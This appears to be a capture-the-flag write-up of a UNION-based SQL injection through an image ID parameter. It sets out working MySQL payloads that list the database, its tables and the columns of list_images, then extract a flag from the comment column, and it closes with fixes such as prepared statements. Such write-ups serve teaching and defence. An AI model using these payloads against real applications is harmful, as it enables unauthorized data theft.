# Proof of Concept
The image ID parameter was vulnerable to UNION-based SQL injection. By injecting SQL statements, it was possible to enumerate the database, tables, and columns, and finally retrieve the comment field containing the flag: **f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188**.

# Explanation
## Find the Database Name

```sql
1 UNION ALL SELECT 1,database()
```

Purpose: Identify which database the vulnerable application is currently using.
* UNION ALL SELECT adds an additional query to the original SQL query.* database() is a MySQL function that returns the current database name.* The result was Member_images.

## Find the Tables

```sql
1 UNION ALL SELECT 1,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema=database()
```

Purpose: Enumerate the tables belonging to the current database.

* information_schema.tables contains metadata about database tables.
* table_schema=database() limits the results to the current database.
* group_concat(table_name) combines all discovered table names into one result.
* This revealed the list_images table.

## Find the Columns

```sql
1 UNION ALL SELECT 1,group_concat(column_name)
FROM information_schema.columns
WHERE table_name=0x6c6973745f696d61676573
```

Purpose: Discover the columns inside the list_images table.

* information_schema.columns contains information about table columns.
* 0x6c6973745f696d61676573 is the hexadecimal representation of list_images.
* group_concat(column_name) combines the column names into one result.
* The columns discovered were:

id, url, title, comment

## Retrieve the Flag

```sql
1 UNION ALL SELECT 1,group_concat(comment,0x0a)
FROM list_images
```

Purpose: Extract the contents of the comment column from list_images.

* FROM list_images accesses the table discovered previously.
* comment contains the target information.
* 0x0a represents a newline character, so group_concat() separates multiple comments onto different lines.
* The result revealed flag.

### Overall
The injections followed a logical enumeration process:
Database → Tables → Columns → Data


# Solution

Use parameterized queries / prepared statements instead of directly concatenating the image ID into SQL queries. Additionally, validate that the image ID is an expected numeric value and use a database account with only the permissions required by the application.